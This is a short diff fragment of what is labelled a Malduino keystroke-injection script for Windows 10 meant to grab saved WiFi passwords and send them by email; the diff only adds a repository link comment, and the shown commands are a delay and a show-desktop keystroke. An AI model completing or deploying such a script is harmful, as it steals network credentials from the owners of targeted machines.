@@ -1,6 +1,7 @@
 REM =============================================
 REM = Windows 10: Grab WiFi and send via e-mail =
 REM =============================================
+REM https://github.com/p0p3j/malduino-scripts
 
 DELAY 2000
 GUI d
